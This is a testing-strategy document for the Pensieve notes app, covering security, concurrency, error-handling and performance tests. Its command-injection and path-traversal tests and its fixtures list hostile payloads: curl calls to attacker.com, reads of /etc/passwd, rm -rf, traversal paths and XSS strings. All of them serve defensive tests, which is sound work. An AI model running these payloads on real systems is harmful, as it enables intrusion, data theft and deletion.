# Pensieve Testing Strategy

**Document Version:** 1.0
**Created:** 2025-11-26
**Purpose:** Comprehensive testing approach for bugs identified in BUG_ANALYSIS_REPORT.md and SECURITY_AUDIT.md

---

## Table of Contents

1. [Overview](#overview)
2. [Test Coverage Goals](#test-coverage-goals)
3. [Test File Structure](#test-file-structure)
4. [Test Scenarios by Category](#test-scenarios-by-category)
5. [Security Testing](#security-testing)
6. [Concurrency Testing](#concurrency-testing)
7. [Error Handling Testing](#error-handling-testing)
8. [Performance Testing](#performance-testing)
9. [CI/CD Integration](#cicd-integration)
10. [Manual Testing Checklists](#manual-testing-checklists)
11. [Success Criteria](#success-criteria)

---

## Overview

This document outlines the testing strategy for addressing the **25 bugs** and **5 security vulnerabilities** identified in the comprehensive code analysis. Testing is organized into automated tests (unit, integration, security) and manual testing procedures.

**Testing Philosophy:**
- **Security First:** 100% coverage of user input paths
- **Concurrency:** All file operations tested with parallel execution
- **Error Handling:** Every API call tested with failure scenarios
- **Type Safety:** Runtime validation of all type assertions

---

## Test Coverage Goals

### Backend Testing

| Category | Target Coverage | Priority |
|----------|----------------|----------|
| Security (user input paths) | 100% | Critical |
| File operations | 90% | High |
| API routes | 85% | High |
| Services (business logic) | 80% | Medium |
| Utilities | 75% | Medium |
| Models | 70% | Low |

### Frontend Testing

| Category | Target Coverage | Priority |
|----------|----------------|----------|
| API client error handling | 100% | Critical |
| Component error boundaries | 100% | High |
| Page components | 70% | Medium |
| UI components | 60% | Medium |
| Utility functions | 80% | Medium |

### Integration Testing

- API contract tests: 100% of endpoints
- Backend/frontend type consistency: 100%
- End-to-end workflows: Critical paths only

---

## Test File Structure

### Backend Tests

```
_system/src/__tests__/
├── security/
│   ├── command-injection.test.ts
│   ├── path-traversal.test.ts
│   ├── input-validation.test.ts
│   └── cors.test.ts
├── concurrency/
│   ├── file-operations.test.ts
│   ├── cache-invalidation.test.ts
│   ├── journal-duplication.test.ts
│   └── note-move-race.test.ts
├── integration/
│   ├── api-notes.test.ts
│   ├── api-journals.test.ts
│   ├── api-projects.test.ts
│   ├── api-jarvis.test.ts
│   ├── api-chats.test.ts
│   └── response-formats.test.ts
├── edge-cases/
│   ├── empty-responses.test.ts
│   ├── special-characters.test.ts
│   ├── boundary-values.test.ts
│   └── malformed-data.test.ts
├── performance/
│   ├── cache-performance.test.ts
│   ├── streak-calculation.test.ts
│   └── note-list-performance.test.ts
└── unit/
    ├── services/
    │   ├── NoteService.test.ts
    │   ├── JournalService.test.ts
    │   ├── ProjectService.test.ts
    │   ├── JarvisService.test.ts
    │   └── ChatService.test.ts
    └── utils/
        ├── frontmatterParser.test.ts
        ├── fileSystem.test.ts
        └── dateUtils.test.ts
```

### Frontend Tests

```
web-ui/src/__tests__/
├── components/
│   ├── ErrorBoundary.test.tsx
│   ├── LoadingStates.test.tsx
│   ├── SummarizeButton.test.tsx
│   └── MoveNoteModal.test.tsx
├── pages/
│   ├── Dashboard.test.tsx
│   ├── Notes.test.tsx
│   ├── NoteDetail.test.tsx
│   ├── Journals.test.tsx
│   ├── Projects.test.tsx
│   ├── ProjectDetail.test.tsx
│   ├── Chats.test.tsx
│   └── ChatDetail.test.tsx
├── api/
│   ├── client.test.ts
│   ├── notes-api.test.ts
│   ├── journals-api.test.ts
│   ├── projects-api.test.ts
│   ├── jarvis-api.test.ts
│   ├── chats-api.test.ts
│   ├── response-validation.test.ts
│   └── error-handling.test.ts
└── integration/
    ├── api-contract.test.ts
    ├── type-consistency.test.ts
    └── race-conditions.test.tsx
```

---

## Test Scenarios by Category

### 1. Security Tests

#### VULN-001: Command Injection Tests

**File:** `_system/src/__tests__/security/command-injection.test.ts`

**Test Cases:**

```typescript
describe('VULN-001: Command Injection Prevention', () => {
  describe('JarvisService.playTTS', () => {
    test('should handle semicolon without execution', async () => {
      const payload = 'test; echo "injected" > /tmp/pwned.txt';
      await jarvisService.playTTS(payload, 'en');

      // Verify no file created
      expect(fs.existsSync('/tmp/pwned.txt')).toBe(false);
    });

    test('should handle backticks as literal text', async () => {
      const payload = 'test `whoami` test';
      await jarvisService.playTTS(payload, 'en');

      // Verify command not executed (no whoami output)
      // TTS should receive literal backticks
    });

    test('should handle dollar sign without variable expansion', async () => {
      const payload = 'Price is $(curl http://attacker.com)';
      await jarvisService.playTTS(payload, 'en');

      // Monitor network - no outbound requests should occur
      expect(networkMonitor.outboundRequests).toHaveLength(0);
    });

    test('should handle pipe without command chaining', async () => {
      const payload = 'hello | cat /etc/passwd';
      await jarvisService.playTTS(payload, 'en');

      // Verify /etc/passwd not accessed
      expect(fileAccessLog).not.toContain('/etc/passwd');
    });

    test('should handle ampersand without background execution', async () => {
      const payload = 'test & sleep 10';
      const start = Date.now();
      await jarvisService.playTTS(payload, 'en');
      const duration = Date.now() - start;

      // Should complete quickly, not wait for background process
      expect(duration).toBeLessThan(5000);
    });

    test('should handle newlines without line breaks', async () => {
      const payload = 'line1\nrm -rf /tmp/test\nline2';
      await jarvisService.playTTS(payload, 'en');

      // Verify no deletion occurred
      expect(fs.existsSync('/tmp/test')).toBe(true);
    });

    test('should reject extremely long input (DoS prevention)', async () => {
      const payload = 'a'.repeat(100000);
      await expect(jarvisService.playTTS(payload, 'en'))
        .rejects.toThrow('Text too long');
    });

    test('should reject control characters', async () => {
      const payload = 'test\x00\x01\x02control';
      await expect(jarvisService.playTTS(payload, 'en'))
        .rejects.toThrow('invalid control characters');
    });
  });

  describe('JarvisService.summarizeNote', () => {
    test('should handle injection in note content', async () => {
      const note = await createTestNote({
        content: 'Summary: $(curl attacker.com/exfil)'
      });

      await jarvisService.summarizeNote(note.id, 'en');

      // Verify no network request
      expect(networkMonitor.outboundRequests).toHaveLength(0);
    });

    test('should handle injection in note title', async () => {
      const note = await createTestNote({
        title: 'Test; echo "pwned" > /tmp/file'
      });

      await jarvisService.summarizeNote(note.id, 'en');

      expect(fs.existsSync('/tmp/file')).toBe(false);
    });
  });

  describe('/api/jarvis/speak endpoint', () => {
    test('should prevent injection via API', async () => {
      const response = await request(app)
        .post('/api/jarvis/speak')
        .send({
          text: 'hello"; rm -rf /tmp/*; echo "world',
          language: 'en'
        });

      expect(response.status).toBe(200);
      // Verify /tmp files still exist
      expect(fs.readdirSync('/tmp').length).toBeGreaterThan(0);
    });
  });
});
```

#### VULN-002: Path Traversal Tests

**File:** `_system/src/__tests__/security/path-traversal.test.ts`

**Test Cases:**

```typescript
describe('VULN-002: Path Traversal Prevention', () => {
  describe('NoteService.moveTo', () => {
    test('should reject parent directory references', async () => {
      const note = await createTestNote();

      await expect(NoteService.moveTo(note, 'projects', '../../etc/passwd'))
        .rejects.toThrow('Parent directory references (..) not allowed');
    });

    test('should reject absolute paths', async () => {
      const note = await createTestNote();

      await expect(NoteService.moveTo(note, 'areas', '/etc/cron.d/malicious'))
        .rejects.toThrow('Absolute paths not allowed');
    });

    test('should reject paths with special characters', async () => {
      const note = await createTestNote();

      await expect(NoteService.moveTo(note, 'inbox', 'path;with;semicolons'))
        .rejects.toThrow('Invalid characters in path');
    });

    test('should accept valid relative paths', async () => {
      const note = await createTestNote();

      await expect(NoteService.moveTo(note, 'projects', 'my-project/notes'))
        .resolves.not.toThrow();

      // Verify note is within vault
      const vaultPath = config.getVaultPath();
      expect(note.filePath).toContain(vaultPath);
    });

    test('should verify final path is within vault', async () => {
      const note = await createTestNote();
      const vaultPath = config.getVaultPath();

      await NoteService.moveTo(note, 'resources', 'test/subdir');

      const resolvedPath = path.resolve(note.filePath);
      const resolvedVault = path.resolve(vaultPath);

      expect(resolvedPath.startsWith(resolvedVault)).toBe(true);
    });

    test('should detect symlink bypass attempts', async () => {
      // Create symlink: vault/test-link -> /etc
      const vaultPath = config.getVaultPath();
      fs.symlinkSync('/etc', path.join(vaultPath, 'test-link'));

      const note = await createTestNote();

      await expect(NoteService.moveTo(note, 'inbox', 'test-link/passwd'))
        .rejects.toThrow('Symlink traversal detected');

      // Cleanup
      fs.unlinkSync(path.join(vaultPath, 'test-link'));
    });

    test('should handle URL-encoded traversal attempts', async () => {
      const note = await createTestNote();

      // %2e%2e%2f = ../
      await expect(NoteService.moveTo(note, 'projects', '%2e%2e%2f%2e%2e%2fetc'))
        .rejects.toThrow();
    });
  });

  describe('/api/notes/:id/move endpoint', () => {
    test('should validate folder parameter', async () => {
      const note = await createTestNote();

      const response = await request(app)
        .post(`/api/notes/${note.id}/move`)
        .send({
          folder: 'invalid-folder',
          subPath: 'test'
        });

      expect(response.status).toBe(400);
      expect(response.body.error).toContain('Invalid folder');
    });

    test('should enforce subPath length limit', async () => {
      const note = await createTestNote();
      const longPath = 'a'.repeat(300);

      const response = await request(app)
        .post(`/api/notes/${note.id}/move`)
        .send({
          folder: 'inbox',
          subPath: longPath
        });

      expect(response.status).toBe(400);
      expect(response.body.error).toContain('Path too long');
    });
  });
});
```

#### VULN-003: Input Validation Tests

**File:** `_system/src/__tests__/security/input-validation.test.ts`

**Test Cases:**

- [ ] Test oversized note content (>1MB)
- [ ] Test extremely long titles (>1000 chars)
- [ ] Test invalid data types (string where number expected)
- [ ] Test negative numbers in progress, energyLevel
- [ ] Test arrays in string fields
- [ ] Test SQL injection strings (should be harmless in file-based system)
- [ ] Test XSS payloads in markdown content
- [ ] Test invalid email formats
- [ ] Test invalid date formats
- [ ] Test empty required fields

---

### 2. Concurrency Tests

#### BUG-001: File Race Conditions

**File:** `_system/src/__tests__/concurrency/file-operations.test.ts`

**Test Cases:**

```typescript
describe('BUG-001: File Race Conditions', () => {
  test('parallel writes to same note should not corrupt data', async () => {
    const note = await createTestNote({ content: 'original' });

    // Spawn 10 concurrent updates
    const updates = Array.from({ length: 10 }, (_, i) =>
      NoteService.update(note.id, { content: `update-${i}` })
    );

    await Promise.all(updates);

    // Verify note content is one of the expected values
    const finalNote = await NoteService.getById(note.id);
    expect(finalNote.content).toMatch(/^update-\d$/);

    // Verify file is not corrupted
    const fileContent = await fs.readFile(finalNote.filePath, 'utf-8');
    expect(() => parseFrontmatter(fileContent)).not.toThrow();
  });

  test('simultaneous move operations should not lose data', async () => {
    const note = await createTestNote();

    // Two concurrent moves to different folders
    const move1 = NoteService.moveTo(note, 'projects', 'project-a');
    const move2 = NoteService.moveTo(note, 'areas', 'area-b');

    await Promise.allSettled([move1, move2]);

    // One should succeed, one should fail
    // Verify note exists in exactly one location
    const locations = [
      path.join(config.getVaultPath(), '1-projects/project-a'),
      path.join(config.getVaultPath(), '2-areas/area-b')
    ];

    const existingLocations = locations.filter(loc =>
      fs.existsSync(path.join(loc, `${note.id}.md`))
    );

    expect(existingLocations).toHaveLength(1);
  });

  test('concurrent journal creation for same date should not duplicate', async () => {
    const date = new Date('2025-11-26');

    // 5 simultaneous requests for same date
    const creates = Array.from({ length: 5 }, () =>
      JournalService.getByDate(date)
    );

    const journals = await Promise.all(creates);

    // All should return same journal (same filePath)
    const filePaths = journals.map(j => j.filePath);
    const uniquePaths = [...new Set(filePaths)];

    expect(uniquePaths).toHaveLength(1);

    // Verify only one file exists
    const journalPath = JournalService.getJournalPath(date);
    expect(fs.existsSync(journalPath)).toBe(true);
  });

  test('cache invalidation during read should not serve stale data', async () => {
    const note = await createTestNote({ content: 'v1' });

    // Start slow read
    const slowRead = NoteService.getById(note.id);

    // Immediately update note (invalidates cache)
    await NoteService.update(note.id, { content: 'v2' });

    // Complete slow read
    const result = await slowRead;

    // Should get v2, not stale v1
    expect(result.content).toBe('v2');
  });
});
```

---

### 3. Error Handling Tests

#### BUG-017: Missing Error UI Feedback

**File:** `web-ui/src/__tests__/pages/error-handling.test.tsx`

**Test Cases:**

```typescript
describe('BUG-017: Error UI Feedback', () => {
  test('Dashboard should show error message on API failure', async () => {
    // Mock API to fail
    jest.spyOn(notesApi, 'list').mockRejectedValue(new Error('Network error'));

    render(<Dashboard />);

    // Wait for error state
    await waitFor(() => {
      expect(screen.getByText(/failed to load/i)).toBeInTheDocument();
    });

    // Should show retry button
    expect(screen.getByRole('button', { name: /retry/i })).toBeInTheDocument();
  });

  test('Notes page should display error banner on fetch failure', async () => {
    jest.spyOn(notesApi, 'list').mockRejectedValue(new Error('500 Server Error'));

    render(<Notes folder="inbox" />);

    await waitFor(() => {
      expect(screen.getByRole('alert')).toHaveTextContent(/server error/i);
    });
  });

  test('Retry button should re-fetch data', async () => {
    const mockList = jest.spyOn(notesApi, 'list')
      .mockRejectedValueOnce(new Error('Fail'))
      .mockResolvedValueOnce({ items: [], total: 0 });

    render(<Dashboard />);

    // Wait for error
    await waitFor(() => screen.getByRole('button', { name: /retry/i }));

    // Click retry
    fireEvent.click(screen.getByRole('button', { name: /retry/i }));

    // Should call API again
    await waitFor(() => {
      expect(mockList).toHaveBeenCalledTimes(2);
    });
  });
});
```

#### BUG-012: Error Boundary Tests

**File:** `web-ui/src/__tests__/components/ErrorBoundary.test.tsx`

**Test Cases:**

```typescript
describe('BUG-012: React Error Boundary', () => {
  test('should catch component errors and show fallback', () => {
    const ThrowError = () => {
      throw new Error('Test error');
    };

    render(
      <ErrorBoundary>
        <ThrowError />
      </ErrorBoundary>
    );

    expect(screen.getByText(/something went wrong/i)).toBeInTheDocument();
    expect(screen.getByRole('button', { name: /reload/i })).toBeInTheDocument();
  });

  test('should log error to console', () => {
    const consoleSpy = jest.spyOn(console, 'error').mockImplementation();

    const ThrowError = () => {
      throw new Error('Test error');
    };

    render(
      <ErrorBoundary>
        <ThrowError />
      </ErrorBoundary>
    );

    expect(consoleSpy).toHaveBeenCalled();
    consoleSpy.mockRestore();
  });

  test('reload button should refresh page', () => {
    delete window.location;
    window.location = { reload: jest.fn() };

    const ThrowError = () => {
      throw new Error('Test error');
    };

    render(
      <ErrorBoundary>
        <ThrowError />
      </ErrorBoundary>
    );

    fireEvent.click(screen.getByRole('button', { name: /reload/i }));

    expect(window.location.reload).toHaveBeenCalled();
  });
});
```

---

### 4. Performance Tests

#### BUG-014: N+1 Query Pattern

**File:** `_system/src/__tests__/performance/cache-performance.test.ts`

**Test Cases:**

```typescript
describe('BUG-014: Performance Optimization', () => {
  test('getAllNotes should complete in <500ms with 100 notes', async () => {
    // Create 100 test notes
    await Promise.all(
      Array.from({ length: 100 }, (_, i) =>
        createTestNote({ title: `Note ${i}` })
      )
    );

    const start = Date.now();
    const notes = await NoteService.getAllNotes();
    const duration = Date.now() - start;

    expect(duration).toBeLessThan(500);
    expect(notes).toHaveLength(100);
  });

  test('cache should reduce second request time by 90%', async () => {
    // First request (cold cache)
    const start1 = Date.now();
    await NoteService.getAllNotes();
    const duration1 = Date.now() - start1;

    // Second request (warm cache)
    const start2 = Date.now();
    await NoteService.getAllNotes();
    const duration2 = Date.now() - start2;

    expect(duration2).toBeLessThan(duration1 * 0.1);
  });
});
```

---

## CI/CD Integration

### Pre-commit Hooks

**File:** `.husky/pre-commit`

```bash
#!/bin/sh
. "$(dirname "$0")/_/husky.sh"

# Run security linter
npx eslint --plugin security --ext .ts,.tsx .

# Run type checks
cd _system && npm run type-check
cd ../web-ui && npm run type-check

# Run unit tests
cd ../system && npm test -- --run
cd ../web-ui && npm test -- --run
```

### GitHub Actions Workflow

**File:** `.github/workflows/security-tests.yml`

```yaml
name: Security Tests

on: [push, pull_request]

jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Setup Node.js
        uses: actions/setup-node@v3
        with:
          node-version: '20'

      - name: Install dependencies
        run: |
          cd _system && npm ci
          cd ../web-ui && npm ci

      - name: Run security tests
        run: |
          cd _system
          npm run test:security

      - name: npm audit
        run: |
          cd _system && npm audit --audit-level=moderate
          cd ../web-ui && npm audit --audit-level=moderate

      - name: Snyk security scan
        uses: snyk/actions/node@master
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}

      - name: OWASP ZAP scan
        uses: zaproxy/action-baseline@v0.7.0
        with:
          target: 'http://localhost:3000'
```

### Coverage Thresholds

**File:** `_system/vitest.config.ts`

```typescript
export default defineConfig({
  test: {
    coverage: {
      provider: 'v8',
      reporter: ['text', 'json', 'html'],
      lines: 80,
      functions: 80,
      branches: 75,
      statements: 80,
      exclude: [
        '**/__tests__/**',
        '**/node_modules/**'
      ]
    }
  }
});
```

---

## Manual Testing Checklists

### Security Verification

**Pre-Production Security Checklist:**

- [ ] Test all user input paths with shell metacharacters
- [ ] Verify file operations stay within vault directory
- [ ] Test CORS headers in browser dev tools
- [ ] Attempt path traversal with `../` in all file operations
- [ ] Test for XSS in markdown rendering
- [ ] Verify authentication on protected endpoints
- [ ] Check error messages don't leak sensitive info
- [ ] Test rate limiting (if implemented)
- [ ] Review HTTPS configuration
- [ ] Verify secure headers (CSP, HSTS, X-Frame-Options)

### UX Testing

- [ ] Verify error messages are user-friendly (not technical stack traces)
- [ ] Check loading states on slow/throttled connections
- [ ] Test form validation before API submission
- [ ] Verify translations work in both languages (en, zh_Hant)
- [ ] Test keyboard navigation
- [ ] Test screen reader compatibility (basic)
- [ ] Verify focus management in modals
- [ ] Test on mobile viewport sizes
- [ ] Check dark mode (if applicable)

### Performance Testing

- [ ] Load 1000+ notes in PARA folder - should complete in <2s
- [ ] Test concurrent API requests (10 simultaneous)
- [ ] Measure cache hit rates (should be >80% on repeated requests)
- [ ] Profile client-side rendering with React DevTools
- [ ] Test first load vs cached load times
- [ ] Measure bundle sizes (should be <500KB gzipped)
- [ ] Test with throttled network (3G simulation)

---

## Success Criteria

### Phase 1: Critical Fixes (Required for Production)

- [ ] Zero critical security vulnerabilities (CVSS 9.0+)
- [ ] Zero high security vulnerabilities (CVSS 7.0-8.9)
- [ ] Command injection tests: 100% pass rate
- [ ] Path traversal tests: 100% pass rate
- [ ] Error boundaries prevent white screen: 100%

### Phase 2: High Priority (Required for Stable Release)

- [ ] All file race condition tests pass
- [ ] Cache performance tests meet benchmarks
- [ ] Error handling tests: >90% pass rate
- [ ] Type safety tests: >95% pass rate
- [ ] API integration tests: 100% pass rate

### Phase 3: Quality Assurance (Recommended)

- [ ] Overall test coverage: >80%
- [ ] Security test coverage: 100%
- [ ] <5% error rate in production monitoring
- [ ] Page load times <2s on 3G
- [ ] Accessibility score >80 (Lighthouse)

### Ongoing Metrics

**Track in production:**
- Error rate: Target <1% of requests
- API response time: p95 <500ms
- Cache hit rate: >80%
- Security incident rate: 0 per quarter
- User-reported bugs: <5 per release

---

## Test Data Management

### Test Fixtures

**File:** `_system/src/__tests__/fixtures/`

```typescript
// test-notes.ts
export const testNotes = {
  basic: {
    title: 'Test Note',
    content: 'Test content',
    tags: ['test']
  },
  withSpecialChars: {
    title: 'Note with "quotes" and `backticks`',
    content: 'Content with $variables and ;semicolons'
  },
  large: {
    title: 'Large Note',
    content: 'x'.repeat(100000) // 100KB
  }
};

// malicious-payloads.ts
export const injectionPayloads = {
  commandInjection: [
    'test; echo "pwned"',
    'test `whoami`',
    'test $(curl attacker.com)',
    'test | cat /etc/passwd',
    'test & sleep 10'
  ],
  pathTraversal: [
    '../../etc/passwd',
    '../../../tmp/test',
    '/etc/cron.d/malicious',
    'test/../../../etc/hosts'
  ],
  xss: [
    '<script>alert("xss")</script>',
    '<img src=x onerror=alert(1)>',
    'javascript:alert(1)'
  ]
};
```

### Cleanup Strategies

```typescript
// Clean up after each test
afterEach(async () => {
  await cleanupTestVault();
  await clearCache();
});

// Clean up after all tests
afterAll(async () => {
  await removeTestFiles();
  await closeDatabase();
});
```

---

## Conclusion

This testing strategy provides comprehensive coverage for the 25 bugs and 5 security vulnerabilities identified. Priority is on security testing (100% coverage of user input paths) followed by concurrency and error handling tests.

**Estimated Testing Effort:**
- Writing tests: 40-50 hours
- Running initial test suite: 2-3 hours
- Fixing failing tests: 20-30 hours
- Total: 60-80 hours

**Key Deliverables:**
1. Automated security test suite (100% critical paths)
2. Concurrency test suite (file operations, cache)
3. Error handling tests (frontend + backend)
4. CI/CD integration (GitHub Actions)
5. Manual testing checklists

**Next Steps:**
1. Set up test infrastructure (Vitest, React Testing Library)
2. Write security tests first (highest priority)
3. Implement fixes based on test failures
4. Add tests to CI/CD pipeline
5. Establish ongoing testing culture

---

**Document Maintained By:** Development Team
**Review Frequency:** Quarterly
**Last Updated:** 2025-11-26
